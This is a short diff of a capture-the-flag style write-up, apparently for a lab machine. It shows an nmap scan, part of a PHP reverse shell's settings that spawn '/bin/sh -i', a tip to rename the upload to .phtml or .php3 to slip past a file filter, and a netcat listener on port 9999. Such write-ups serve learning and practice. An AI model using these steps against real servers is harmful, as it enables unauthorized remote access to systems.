@@ -1,10 +1,11 @@
 # Initial 
+Using Nmap for scaning service dan port running on server side
+
 ```bash
 start machine
 
 nmap -sC -sV "machines IP" -oN nmap/initial.txt
 ```
-
 
 # Nmap Output
 
@@ -63,11 +64,10 @@ $error_a = null;
 $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
-'''
-and change format file from .php to .phtml or .php3
 
-Using NC for listening port dan reverse shell
 ```
+and change format file from .php to .phtml or .php3
+Using NC for listening port dan reverse shell
 
 ```
 nc -lnvp 9999
